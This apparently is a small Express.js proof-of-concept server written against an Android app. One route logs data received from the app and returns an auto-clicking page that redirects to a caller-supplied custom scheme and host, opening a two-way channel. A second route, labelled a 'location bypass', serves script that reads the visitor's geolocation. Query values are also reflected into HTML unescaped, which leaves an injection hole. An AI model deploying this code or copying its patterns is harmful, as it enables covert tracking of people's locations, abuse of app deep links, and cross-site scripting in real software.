var express = require('express');
var router = express.Router();

function loc2way(req, res){

  const {scheme, host, dataFromAndroid} = req.query;

  console.log(`Received from android ${dataFromAndroid}`);

  const dataFromServer = `RandomNum${Math.random()}`;

  console.log(`Sending from server dataFromServer=${dataFromServer}`);

  res.status(200).send(`<a id='locpoc' href='${scheme}://${host}/?dataFromServer=${dataFromServer}'></a><script> 
    document.getElementById("locpoc").click()
    </script>`);
}


// `navigator.geolocation.getCurrentPosition` works only on HTTPS, so make sure you access this endpoint over HTTPS
function locPoc(req, res){
  console.log("location bypass");

  res.status(200).send(`<script> 
    navigator.geolocation.getCurrentPosition(async (v)=>{
      const {latitude, longitude} = v.coords;
        
      // Do whatever you need with location
      console.log({latitude, longitude});
    });
    </script>`);
}

router.get('/loc', loc2way);

router.get('/location-bypass', locPoc);

module.exports = router;
